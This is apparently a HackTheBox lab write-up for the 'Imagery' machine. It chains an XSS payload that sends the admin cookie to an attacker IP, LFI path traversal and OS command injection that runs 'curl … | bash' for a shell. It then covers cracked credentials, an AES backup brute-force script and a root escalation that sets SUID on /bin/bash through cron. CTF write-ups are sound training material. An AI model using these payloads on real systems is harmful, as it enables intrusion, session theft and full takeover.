# Imagery: HackTheBox

## Enumeration

Port 22,8000 were open.

## Initial Access

The first step is to sign up and make an account. Now we can poke around the webpage, there doesnt seem to be much. But on inspecting the source I saw a shit ton of JS, which my browser refused to show. So I used the below script to get the js from the page.

### Quick Script I wrote to extract all the JS from the page

```python

import requests
from bs4 import BeautifulSoup

url = "http://imagery.htb:8000"
cookies = {"session":".eJyrVkrJLC7ISaz0TFGyUkoySzNJSU5KVNJRyix2TMnNzFOySkvMKU4F8eMzcwtSi4rz8xJLMvPS40tSi0tKi1OLkFXAxOITk5PzS_NK4HIgwbzE3FSgHSA1DiBCLzk_V6kWAMF-Lxg.aNyIaw.YZHWU417HjNhJPyfxYZH39MR1Tk"}

# Get the webpage

print("[*] Getting the webpage")

res = requests.get(url, cookies=cookies)
if res.status_code == 200:
    print("[+] SUccessfully got webpage")
else:
    print("[-] An error occured")
    exit(1)

print("[*] Obtaining script tags")
parser = BeautifulSoup(res.text, "html.parser")
js = parser.find_all("script")

print("[*] Writing output to file")
with open("source.js", mode="w") as file:
    file.write(js[2].text)

print("[+] Successfully written output to file")
```

From the code we can see that the /submit_report endpoint is vulnerable to XSS because the report description is not sanitized by DOMPurify. So I will just provide in a title and the description of the bug will be 

```html
<img src=x onerror="fetch('http://<ip>:<port>/?c='+document.cookie)" />
```

This will reveal the admin session cookie.

Using this we'll login to the admin panel. (simply modify the existing cookie on the webpage)

From here the download logs functionality is vulnerable to classic LFI `/admin/get_system_log?log_identifier=../../../../etc/passwd`.
So let's try and read some source code from `../app.py`.

Based on the source code we can construct a directory structure like this for the app:
```
project/
│
├── app.py                         # The main entry point (your provided script)
├── config.py                      # Configuration variables (e.g., SYSTEM_LOG_FOLDER, BLOCKED_APP_PORTS)
├── utils.py                       # Contains _load_data(), _save_data(), etc.
│
├── templates/
│   └── index.html                 # Template rendered at the root endpoint ('/')
│
├── api_auth.py                    # Blueprint for authentication
├── api_upload.py                  # Blueprint for upload handling
├── api_manage.py                  # Blueprint for managing uploaded content
├── api_edit.py                    # Blueprint for editing content
├── api_admin.py                   # Blueprint for admin-related routes
├── api_misc.py                    # Blueprint for miscellaneous routes
│
├── db.json                          # location for your data file (used by _load_data / _save_data, read from config.py)
│
├── logs/                          # User log files stored here (matches SYSTEM_LOG_FOLDER)
│   └── <username>.log             # One log file per user
│
└── static/                        # (Optional) For serving static assets like JS, CSS, images
    └── ...                        # Static files here

```

This is db.json

```json
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "isAdmin": true,
            "displayId": "a1b2c3d4",
            "login_attempts": 0,
            "isTestuser": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "isAdmin": false,
            "displayId": "e5f6g7h8",
            "login_attempts": 0,
            "isTestuser": true,
            "failed_login_attempts": 0,
            "locked_until": null
        }
    ],
    "images": [],
    "image_collections": [
        {
            "name": "My Images"
        },
        {
            "name": "Unsorted"
        },
        {
            "name": "Converted"
        },
        {
            "name": "Transformed"
        }
    ],
    "bug_reports": [
        {
            "id": "f15a79b2-451c-4907-9a56-c6399beb16e3",
            "name": "Hacked !!!",
            "details": "<img src=x onerror=\"fetch('http://10.10.14.156:8000/?c='+document.cookie)\"/>",
            "reporter": "test@test.com",
            "reporterDisplayId": "b6f4dcba",
            "timestamp": "2025-10-01T02:03:38.823828"
        }
    ]
}
```


From cracking the passwords in db.json we can get this credential set:
`testuser@imagery.htb:iambatman`

```
POST /apply_visual_transform HTTP/1.1
Host: imagery.htb:8000
Content-Length: 156
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://imagery.htb:8000
Referer: http://imagery.htb:8000/
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aNySeQ.ibhlu71PKo_UUrsWbcSakgaALbY
Connection: keep-alive

{"imageId":"41d55ddd-6361-46a5-9b8c-a678791ef40d","transformType":"crop","params":{"x":"79; curl http://10.10.14.156:8000;","y":0,"width":638,"height":800}}
```

Crop image functionality has os command injection

`{"imageId":"41d55ddd-6361-46a5-9b8c-a678791ef40d","transformType":"crop","params":{"x":"79; $(curl http://10.10.14.156:8000/shell.sh | bash) #","y":0,"width":638,"height":800}}` send this to gain shell.

By analyzing the source code of the admin bot we get this credential set:
`admin@imagery.htb:strongsandofbeach`

None of these yielded anything. Now in /var/backup there was a backup just chilling there. But it was encrypted with AES. So I downloaded it onto my machine and checked its filetype.

I got this

```bash
web_20250806_120723.zip.aes: AES encrypted data, version 2, created by "pyAesCrypt 6.1.1"
```

So with this data I got this script that bruteforces the AES password:

```python
#!/usr/bin/env python3
import pyAesCrypt
import sys
import os

if len(sys.argv) < 3:
    print("Usage: python try_wordlist_pyAesCrypt.py file.zip.aes wordlist.txt [outdir]")
    sys.exit(1)

encfile = sys.argv[1]
wordlist = sys.argv[2]
outdir = sys.argv[3] if len(sys.argv) > 3 else "attempt_out"
os.makedirs(outdir, exist_ok=True)

# chunk size used by pyAesCrypt (default value).
bufferSize = 64 * 1024

total = 0
with open(wordlist, "r", errors="ignore") as f:
    for line in f:
        pwd = line.rstrip("\n\r")
        if not pwd:
            continue
        total += 1
        if total % 1000 == 0:
            print(f"Attempt #{total}: '{pwd[:30]}'")
        outpath = os.path.join(outdir, "temp_decrypted_output")
        try:
            # pyAesCrypt.decryptFile throws ValueError on wrong password (or IntegrityError)
            pyAesCrypt.decryptFile(encfile, outpath, pwd, bufferSize)
            print()
            print("=== Password found! ===")
            print(pwd)
            print("Decrypted output saved to:", outpath)
            sys.exit(0)
        except (ValueError, Exception) as e:
            # Wrong password will generally raise ValueError / IntegrityError
            # Remove any incomplete file
            if os.path.exists(outpath):
                try:
                    os.remove(outpath)
                except:
                    pass
            # continue trying
            continue

print("Password NOT found in the provided wordlist.")
sys.exit(2)

```

Courtesy of chatgpt lol. 

When using rockyou.txt it yields `bestfriends` as the password. Now this just contains the web directory we saw on initial access but with a new password for a user `mark`. So the credentials are `mark:supersmash`.

Now that that's done let's `su mark` and get user flag.

## Privilege Escalation

Now on running `sudo -l` you can see this

```bash
Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```

So we'll exploit that using it's help menu to read the docs (couldnt find this thing online idk why).

First I ran:

```bash
sudo /usr/local/bin/charcol -R
```

This completely resets the password (I saw this from the help menu.)
Then run this

```bash
sudo /usr/local/bin/charcol shell
```

Now you can enter the shell. After this we will schedule a malicious cron job that will give privileged mode to bash.

So I did this in the charcol shell

```bash
auto add --schedule "* * * * *" --command "chmod +s /bin/bash" --name "hack"
```

Wait for a bit and then run `/bin/bash -p`. You will get root.
